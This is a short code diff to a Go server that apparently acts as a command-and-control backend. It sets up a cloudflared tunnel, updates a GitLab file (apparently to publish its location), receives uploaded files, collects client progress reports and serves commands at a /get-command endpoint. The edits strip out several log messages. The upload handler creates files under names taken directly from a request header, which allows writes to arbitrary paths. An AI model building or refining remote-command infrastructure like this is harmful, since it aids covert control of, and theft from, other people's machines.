@@ -135,9 +135,8 @@ func ensureCloudflared() string {
 
 func uploadHandler(w http.ResponseWriter, r *http.Request) {
 	// 1. Get the custom instruction from the HTTP header
-	mediaType := r.Header.Get("X-Media-Type")
+
 	fileName := r.Header.Get("X-File-Name")
-	fmt.Printf("Receiving a %s file named: %s...\n", mediaType, fileName)
 
 	// 2. Create the blank local file on disk
 	dst, err := os.Create(fileName)
@@ -171,7 +170,7 @@ func handleProgressUpdate(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	fmt.Printf("Client update received: %s\n", report.Progress)
+	fmt.Println(report.Progress)
 
 	w.WriteHeader(http.StatusOK)
 }
@@ -310,7 +309,6 @@ func main() {
 		fmt.Println("Error updating GitLab file:", err)
 		return
 	}
-	fmt.Println("Successfully updated!")
 
 	http.HandleFunc("/upload", uploadHandler)
 	http.HandleFunc("/get-command", commandHandler)
